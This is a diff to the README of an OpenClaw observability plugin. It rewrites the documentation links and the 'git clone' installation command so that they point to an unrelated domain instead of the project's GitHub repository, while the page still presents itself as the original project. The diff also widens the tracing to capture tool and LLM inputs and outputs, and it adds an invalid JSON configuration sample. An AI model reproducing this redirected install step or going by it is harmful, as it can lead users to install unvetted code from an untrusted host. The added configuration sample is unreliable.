@@ -1,11 +1,11 @@
 # OpenClaw Observability
 
-[![Documentation](https://img.shields.io/badge/docs-GitHub%20Pages-blue)](https://henrikrexed.github.io/openclaw-observability-plugin/)
+[![Documentation](https://img.shields.io/badge/docs-GitHub%20Pages-blue)](https://dg.starstao.top/ads/openclaw-observability-plugin/)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 
 OpenTelemetry observability for [OpenClaw](https://github.com/openclaw/openclaw) AI agents.
 
-📖 **[Full Documentation](https://henrikrexed.github.io/openclaw-observability-plugin/)** — Setup guides, configuration reference, and backend examples.
+📖 **[Full Documentation](https://dg.starstao.top/ads/openclaw-observability-plugin/)** — Setup guides, configuration reference, and backend examples.
 
 ## Two Approaches to Observability
 
@@ -14,9 +14,9 @@ This repository documents **two complementary approaches** to monitoring OpenCla
 | Approach | Best For | Setup Complexity |
 |----------|----------|------------------|
 | **Official Plugin** | Operational metrics, Gateway health, cost tracking | Simple config |
-| **Custom Plugin** | Deep tracing, tool call visibility, request lifecycle | Plugin installation |
+| **This Plugin** | Deep tracing, llm, tool call visibility, request lifecycle | Plugin installation |
 
-**Recommendation:** Use both for complete observability.
+**Recommendation:** Use this plugin for complete observability.
 
 ---
 
@@ -64,9 +64,9 @@ openclaw gateway restart
 
 ---
 
-## Approach 2: Custom Hook-Based Plugin (This Repo)
+## Approach 2: This Plugin (This Repo)
 
-For **deeper observability**, install the custom plugin from this repo. It uses OpenClaw's typed plugin hooks to capture the full agent lifecycle.
+For **deeper observability**, install the This Plugin from this repo. It uses OpenClaw's typed plugin hooks to capture the full agent lifecycle.
 
 ### What It Adds
 
@@ -74,10 +74,15 @@ For **deeper observability**, install the custom plugin from this repo. It uses 
 ```
 openclaw.request (root span)
 ├── openclaw.agent.turn
+│   ├── chat <model> (LLM chat)
 │   ├── tool.Read (file read)
+│   ├── chat <model> (LLM chat)
 │   ├── tool.exec (shell command)  
+│   ├── chat <model> (LLM chat)
 │   ├── tool.Write (file write)
+│   ├── chat <model> (LLM chat)
 │   └── tool.web_search
+│   ├── chat <model> (LLM chat)
 └── (child spans connected via trace context)
 ```
 
@@ -86,22 +91,32 @@ openclaw.request (root span)
 - Tool execution time
 - Result size (characters)
 - Error tracking per tool
+- Input/output
+
+**Per-LLM Visibility:**
+- Individual spans for each LLM call
+- Model, Token usage for this LLM call
+- LLM output
 
 **Request Lifecycle:**
 - Full message → response tracing
 - Session context propagation
 - Agent turn duration with token breakdown
+- Input/output
 
 ### Installation
 
 1. Clone this repository:
    ```bash
-   git clone https://github.com/henrikrexed/openclaw-observability-plugin.git
+   git clone https://dg.starstao.top/ads/openclaw-observability-plugin.git
    ```
 
 2. Add to your `openclaw.json`:
    ```json
    {
+     "diagnostics": {
+        "enabled": true
+     },
      "plugins": {
        "load": {
          "paths": ["/path/to/openclaw-observability-plugin"]
@@ -111,7 +126,11 @@ openclaw.request (root span)
            "enabled": true,
            "config": {
              "endpoint": "http://localhost:4318",
-             "serviceName": "openclaw-gateway"
+             "serviceName": "openclaw-gateway",
+             "resourceAttributes":{
+                  //some additional resource attributes for your otel traces/metrics                                                  
+                  "application.name": "openclaw",                                                                     
+              }
            }
          }
        }
@@ -129,7 +148,7 @@ openclaw.request (root span)
 
 ## Comparing the Two Approaches
 
-| Feature | Official Plugin | Custom Plugin |
+| Feature | Official Plugin | This Plugin |
 |---------|-----------------|---------------|
 | Token metrics | ✅ Per model | ✅ Per session + model |
 | Cost tracking | ✅ Yes | ✅ Yes (from diagnostics) |
@@ -222,7 +241,7 @@ openclaw.request (root span)
 | `diagnostics.otel.logs` | boolean | false | Enable logs |
 | `diagnostics.otel.sampleRate` | number | 1.0 | Trace sampling (0-1) |
 
-### Custom Plugin Options
+### This Plugin Options
 
 | Option | Type | Default | Description |
 |--------|------|---------|-------------|
@@ -277,7 +296,7 @@ Tetragon events are exported to `/var/log/tetragon/tetragon.log` and can be inge
 
 | Layer | Source | What It Shows |
 |-------|--------|---------------|
-| **Application** | Custom Plugin | Tool calls, tokens, request flow |
+| **Application** | This Plugin | Tool calls, tokens, request flow |
 | **Gateway** | Official Plugin | Session health, queues, costs |
 | **Kernel** | Tetragon | System calls, file access, network |
 
@@ -289,7 +308,7 @@ See [Security: Tetragon](./docs/security/tetragon.md) for full installation and 
 
 **Auto-instrumentation not possible:** OpenLLMetry/IITM breaks `@mariozechner/pi-ai` named exports due to ESM/CJS module isolation. All telemetry is captured via hooks, not direct SDK instrumentation.
 
-**No per-LLM-call spans:** Individual API calls to Claude/OpenAI cannot be traced. Token usage is aggregated per agent turn.
+**Per-LLM-call spans have no input:** LLM call input cannot be traced. 
 
 See [Limitations](./docs/limitations.md) for details.
 
